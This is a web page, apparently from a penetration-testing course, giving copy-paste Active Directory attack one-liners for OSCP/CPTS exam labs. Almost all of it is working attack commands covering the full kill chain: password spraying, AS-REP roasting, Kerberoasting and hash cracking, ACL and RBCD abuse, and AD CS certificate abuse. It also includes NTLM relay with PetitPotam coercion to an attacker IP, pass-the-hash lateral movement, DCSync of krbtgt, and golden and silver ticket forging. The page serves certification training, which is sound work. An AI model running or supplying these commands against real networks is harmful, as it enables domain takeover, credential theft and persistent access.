---
layout: default
title: "AD Cheatsheet — Exam One-Liners"
order: 9
phase: "REF"
tactic: "Cheatsheet"
summary: "Copy-paste one-liners for the whole AD kill-chain: enum, roasting, BloodHound, ACL, AD CS, lateral movement, DCSync and ticket forging."
---

{% include ad_nav.html %}

# AD Cheatsheet — Exam One-Liners

Fast, copy-paste reference for OSCP/CPTS. Set your variables once, then paste. Full explanations live in the linked modules.

## 0. Set variables

```bash
export DC=10.10.10.100
export DOMAIN=corp.local
export USER=m.rossi
export PASS='Welcome2026!'
export DCFQDN=dc01.$DOMAIN
```

## 1. Enumeration

```bash
sudo nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268,5985,9389 $DC
sudo ntpdate $DC                                              # fix Kerberos clock skew
nxc smb $DC -u '' -p '' --rid-brute 10000                     # null-session RID cycling
nxc smb $DC -u '' -p '' --pass-pol                            # lockout policy BEFORE spraying
enum4linux-ng -A $DC
ldapsearch -x -H ldap://$DC -b "DC=corp,DC=local" '(objectClass=user)' sAMAccountName
kerbrute userenum --dc $DC -d $DOMAIN users.txt -o valid_users.txt
kerbrute passwordspray --dc $DC -d $DOMAIN valid_users.txt "$PASS"
```

## 2. AS-REP Roasting

```bash
impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile valid_users.txt -dc-ip $DC -format hashcat -outputfile asrep.txt
impacket-GetNPUsers $DOMAIN/$USER:"$PASS" -request -format hashcat -dc-ip $DC
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## 3. Kerberoasting

```bash
impacket-GetUserSPNs $DOMAIN/$USER:"$PASS" -dc-ip $DC -request -outputfile kerb.txt
nxc ldap $DC -u $USER -p "$PASS" --kerberoasting kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## 4. BloodHound

```bash
bloodhound-python -u $USER -p "$PASS" -d $DOMAIN -ns $DC -c All --zip
nxc ldap $DC -u $USER -p "$PASS" --bloodhound --collection All --dns-server $DC
```

## 5. ACL / DACL abuse

```bash
# ForceChangePassword
bloodyAD -u $USER -p "$PASS" -d $DOMAIN --host $DC set password victim 'N3wP@ss!2026'
net rpc password victim 'N3wP@ss!2026' -U "$DOMAIN"/$USER%"$PASS" -S $DC
# GenericAll on group -> add self
bloodyAD -u $USER -p "$PASS" -d $DOMAIN --host $DC add groupMember "Helpdesk Admins" $USER
# WriteDacl -> grant GenericAll
impacket-dacledit -action write -rights FullControl -principal $USER -target-dn "CN=victim,CN=Users,DC=corp,DC=local" $DOMAIN/$USER:"$PASS" -dc-ip $DC
# WriteOwner -> owneredit
impacket-owneredit -action write -new-owner $USER -target victim $DOMAIN/$USER:"$PASS" -dc-ip $DC
# Shadow Credentials (GenericWrite / AddKeyCredentialLink)
certipy-ad shadow auto -u $USER@$DOMAIN -p "$PASS" -account victim -dc-ip $DC
# RBCD (GenericWrite on computer)
impacket-addcomputer $DOMAIN/$USER:"$PASS" -computer-name 'EVILPC$' -computer-pass 'EvilPass123!' -dc-ip $DC
impacket-rbcd -action write -delegate-from 'EVILPC$' -delegate-to 'TARGET$' -dc-ip $DC $DOMAIN/$USER:"$PASS"
impacket-getST -spn 'cifs/TARGET.corp.local' -impersonate Administrator -dc-ip $DC $DOMAIN/'EVILPC$':'EvilPass123!'
```

## 6. AD CS (ESC1–ESC8)

```bash
certipy-ad find -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC -stdout -vulnerable
# ESC1 / ESC6
certipy-ad req -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC -ca CORP-CA01-CA -template CorpUser -upn administrator@$DOMAIN
certipy-ad auth -pfx administrator.pfx -dc-ip $DC
# ESC8 relay
impacket-ntlmrelayx -t http://ca01.$DOMAIN/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
python3 PetitPotam.py -u $USER -p "$PASS" -d $DOMAIN <ATTACKER_IP> $DC
```

## 7. Lateral movement

```bash
nxc smb 10.10.10.0/24 -u administrator -H <NTHASH> --continue-on-success      # find (Pwn3d!)
evil-winrm -i $DC -u administrator -H <NTHASH>
impacket-psexec  administrator@$DCFQDN -hashes :<NTHASH>
impacket-wmiexec administrator@$DCFQDN -hashes :<NTHASH>
impacket-getTGT $DOMAIN/administrator -hashes :<NTHASH> -dc-ip $DC && export KRB5CCNAME=administrator.ccache
impacket-secretsdump administrator@10.10.10.20 -hashes :<NTHASH>
xfreerdp /v:10.10.10.20 /u:administrator /pth:<NTHASH> /cert:ignore
```

## 8. DCSync & ticket forging

```bash
# DCSync
impacket-secretsdump $DOMAIN/administrator:'P@ss'@$DC -just-dc-user krbtgt
impacket-secretsdump -k -no-pass administrator@$DCFQDN
impacket-lookupsid $DOMAIN/administrator:'P@ss'@$DC 0 | grep 'Domain SID'
# Golden ticket
impacket-ticketer -aesKey <KRBTGT_AES> -domain-sid <SID> -domain $DOMAIN administrator
export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass administrator@$DCFQDN
# Silver ticket (one service)
impacket-ticketer -nthash <SVC_HASH> -domain-sid <SID> -domain $DOMAIN -spn cifs/target.$DOMAIN administrator
```

## 9. Hashcat modes quick ref

```bash
# 18200  Kerberos AS-REP (etype 23 / RC4)
# 13100  Kerberos TGS-REP (etype 23 / RC4)   Kerberoast
# 19600  TGS-REP AES-128     19700  TGS-REP AES-256
# 1000   NTLM      3000  LM       5600  NetNTLMv2       5500  NetNTLMv1
```

<div class="callout tip">
  <span class="callout-title">Golden rule</span>
  Sync the clock (<code>ntpdate $DC</code>), collect BloodHound the moment you get a credential, and never spray more than one password per lockout window.
</div>

{% include toc_sidebar.html %}
